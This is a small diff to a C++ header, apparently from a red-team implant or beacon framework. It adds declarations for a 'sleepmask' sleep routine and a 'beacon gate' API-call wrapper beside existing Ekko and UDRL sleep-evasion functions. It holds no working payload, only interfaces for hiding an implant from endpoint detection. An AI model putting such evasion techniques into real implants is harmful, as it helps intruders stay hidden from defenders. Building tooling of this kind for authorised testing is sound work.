@@ -57,6 +57,11 @@ namespace starburst {
     auto declfn evasion_full_image_sleep( instance& inst, uint32_t sleep_ms ) -> void;
     auto declfn evasion_ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void;
     auto declfn evasion_udrl_sleep( instance& inst, uint32_t sleep_ms ) -> void;
+    auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> void;
+    auto declfn evasion_beacon_gate_call(
+        instance& inst, void* fn_ptr, int win_api_id,
+        int num_args, ULONG_PTR* args, bool mask
+    ) -> ULONG_PTR;
 
 #if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
     auto declfn spoof_init( instance& inst ) -> void;
